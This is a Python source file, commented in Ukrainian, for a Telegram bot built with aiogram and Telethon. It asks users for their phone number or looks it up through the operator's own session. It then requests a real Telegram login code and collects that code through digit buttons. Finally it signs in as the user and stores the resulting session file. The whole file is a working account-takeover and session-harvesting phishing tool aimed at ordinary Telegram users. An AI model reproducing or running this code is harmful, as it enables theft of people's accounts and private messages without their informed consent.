import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.types import Message, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from telethon.sync import TelegramClient
from telethon.errors import PhoneNumberInvalidError, FloodWaitError, SessionPasswordNeededError
from config import MAIN_BOT_TOKEN, API_ID, API_HASH, SESSION_FOLDER

# --- НАЛАШТУВАННЯ ДЛЯ ТЕСТУВАННЯ ---
# Встанови True, щоб тестувати кнопки без запиту коду до Telegram.
# Встанови False, щоб бот працював у звичайному режимі.
DEBUG_MODE = False
# ---------------------------------

logging.basicConfig(level=logging.INFO)
bot = Bot(token=MAIN_BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())


class AuthStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code_digit = State()


user_data = {}

MY_SESSION_PATH = "my_account.session"


async def get_user_phone_from_chat(user_id: int):
    """
    Отримує номер телефону користувача з чату, якщо він відкритий.
    Повертає номер телефону або None, якщо він прихований.
    """
    client = TelegramClient(MY_SESSION_PATH, API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            print("Помилка: Твоя власна сесія не авторизована.")
            return None

        print(f"Спроба отримати дані для user_id: {user_id}")

        # Отримуємо повний об'єкт користувача через твою сесію
        user_entity = await client.get_entity(user_id)

        # Перевіряємо, чи є у нього номер телефону
        if user_entity.phone:
            print(f"✅ Номер знайдено: {user_entity.phone}")
            return user_entity.phone
        else:
            print(f"❌ Номер телефону для user_id {user_id} прихований.")
            return None

    except ValueError:
        # Ця помилка може виникнути, якщо користувач заблокував твого бота
        # або якщо user_id не існує
        print(f"❌ Не вдалося знайти користувача {user_id}. Можливо, він заблокував бота.")
        return None
    except Exception as e:
        print(f"❌ Інша помилка при отриманні даних користувача: {e}")
        return None
    finally:
        await client.disconnect()


async def get_user_phone_if_open(user_id: int):
    client = TelegramClient("my_account.session", API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return None
        user_entity = await client.get_entity(user_id)
        return user_entity.phone
    except Exception:
        return None
    finally:
        await client.disconnect()


def get_digit_keyboard():
    buttons = [
        [InlineKeyboardButton(text="1", callback_data="digit_1"),
         InlineKeyboardButton(text="2", callback_data="digit_2"),
         InlineKeyboardButton(text="3", callback_data="digit_3")],
        [InlineKeyboardButton(text="4", callback_data="digit_4"),
         InlineKeyboardButton(text="5", callback_data="digit_5"),
         InlineKeyboardButton(text="6", callback_data="digit_6")],
        [InlineKeyboardButton(text="7", callback_data="digit_7"),
         InlineKeyboardButton(text="8", callback_data="digit_8"),
         InlineKeyboardButton(text="9", callback_data="digit_9")],
        [InlineKeyboardButton(text="Стерти", callback_data="digit_erase"),
         InlineKeyboardButton(text="0", callback_data="digit_0"),
         InlineKeyboardButton(text="✅ Готово", callback_data="digit_confirm")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)


@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    user_id = message.from_user.id

    await message.answer("🔄 Перевіряю твої дані...")

    # --- НОВА ЛОГІКА ---
    phone_number = await get_user_phone_if_open(user_id)

    if phone_number:
        # УСПІХ! Номер відкритий, можемо одразу просити код
        await message.answer(
            f"✅ Твій номер телефону `{phone_number}` знайдено.\n\n"
            "Готовий надіслати запит на код підтвердження?",
            reply_markup=types.ReplyKeyboardMarkup(
                keyboard=[[types.KeyboardButton(text="Так, надішли код")]],
                resize_keyboard=True,
                one_time_keyboard=True
            )
        )
        # Зберігаємо номер і переходимо до стану очікування підтвердження
        await state.update_data(phone=phone_number)
        await state.set_state(AuthStates.waiting_for_code_digit)  # Можна одразу переходити до коду
    else:
        # ПОМИЛКА! Номер прихований, просимо користувача
        await message.answer(
            "🤷 Не вдалося автоматично визначити твій номер.\n"
            "Можливо, ти приховав його в налаштуваннях приватності.\n\n"
            "Будь ласка, надай його вручну:",
            reply_markup=types.ReplyKeyboardMarkup(
                keyboard=[[types.KeyboardButton(text="📱 Надіслати мій номер", request_contact=True)]],
                resize_keyboard=True,
                one_time_keyboard=True
            )
        )
        # Зберігаємо стан очікування телефону
        await state.set_state(AuthStates.waiting_for_phone)


@dp.message(F.contact, AuthStates.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext):
    phone_number = message.contact.phone_number
    user_id = message.from_user.id
    await message.answer("🔄 Обробляю номер...", reply_markup=ReplyKeyboardRemove())

    # --- ГОЛОВНА ЗМІНА ---
    if not DEBUG_MODE:
        # РЕЖИМ РЕАЛЬНОЇ РОБОТИ: Створюємо клієнт і відправляємо запит
        session_name = f"{phone_number.replace('+', '')}.session"
        session_path = f"{SESSION_FOLDER}/{session_name}"
        client = TelegramClient(session_path, API_ID, API_HASH)
        try:
            await client.connect()
            await client.send_code_request(phone_number)
            user_data[user_id] = {'client': client, 'phone': phone_number, 'code': ''}
            await message.answer(
                f"✅ Код надіслано на `{phone_number}`.\n\n"
                "Введи його, натискаючи кнопки нижче:",
                reply_markup=get_digit_keyboard()
            )
            await state.set_state(AuthStates.waiting_for_code_digit)
            return  # Вихід, щоб не йти далі
        except (PhoneNumberInvalidError, FloodWaitError, Exception) as e:
            await message.answer(f"❌ Помилка запиту коду: {e}")
            await state.clear()
            return

    # РЕЖИМ ДЕМО/ТЕСТУВАННЯ:
    # Код нижче виконується, якщо DEBUG_MODE == True
    # Ми не створюємо клієнт Telethon, а просто імітуємо отримання номера.
    user_data[user_id] = {'client': None, 'phone': phone_number, 'code': ''}
    await message.answer(
        f"🧪 **ДЕМО-РЕЖИМ**\n\n"
        f"Номер `{phone_number}` отримано.\n"
        f"Запит до Telegram **не відправлявся**.\n\n"
        "Тепер можеш тестувати кнопки для введення коду:",
        reply_markup=get_digit_keyboard()
    )
    await state.set_state(AuthStates.waiting_for_code_digit)


@dp.callback_query(F.data.startswith("digit_"), AuthStates.waiting_for_code_digit)
async def process_digit(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    action = callback.data.split("_")[1]

    if user_id not in user_data:
        await callback.message.answer("Помилка, почни заново /start")
        await state.clear()
        return

    current_code = user_data[user_id]['code']

    if action == 'erase':
        current_code = current_code[:-1]
    elif action == 'confirm':
        if len(current_code) == 5:
            # Якщо це демо-режим, просто показуємо результат
            if DEBUG_MODE:
                await callback.message.edit_text(
                    f"🧪 **ДЕМО-РЕЖИМ**\n\n"
                    f"Ти ввів код: `{current_code}`\n"
                    f"Для номера: `{user_data[user_id]['phone']}`\n\n"
                    f"Оскільки це демо, ніяких дій з Telegram не відбулося."
                )
                await state.clear()
                return
            else:
                # Якщо це реальний режим, викликаємо функцію входу
                await finalize_sign_in(callback.message, user_id, current_code, state)
                return
        else:
            await callback.answer("Код має містити 5 цифр!", show_alert=True)
            return
    else:  # Це цифра
        if len(current_code) < 5:
            current_code += action

    user_data[user_id]['code'] = current_code

    await callback.message.edit_text(
        f"Введений код: `{current_code}`\n\n"
        "Продовжуй вводити або натисни 'Готово':",
        reply_markup=get_digit_keyboard()
    )
    await callback.answer()


async def finalize_sign_in(message: Message, user_id: int, code: str, state: FSMContext):
    await message.edit_text("🔄 Перевіряю код...")
    client = user_data[user_id]['client']
    phone_number = user_data[user_id]['phone']

    try:
        await client.sign_in(phone_number, code=code)
        await message.edit_text(
            f"✅ **Успіх!**\n\n"
            f"Сесію для `{phone_number}` створено."
        )
    except SessionPasswordNeededError:
        await message.edit_text(
            "❌ Помилка: на акаунті ввімкнено 2FA (пароль)."
            "Цей метод не підтримує паролі."
        )
    except Exception as e:
        await message.edit_text(
            f"❌ **Помилка входу!**\n\n"
            f"Не вдалося увійти. Telegram повідомив:\n`{e}`\n\n"
            "Це може означати, що Telegram заблокував спробу входу через підозрілу активність."
        )
    finally:
        if client and client.is_connected():
            await client.disconnect()
        user_data.pop(user_id, None)
        await state.clear()


if __name__ == "__main__":
    import os

    os.makedirs(SESSION_FOLDER, exist_ok=True)
    asyncio.run(dp.start_polling(bot))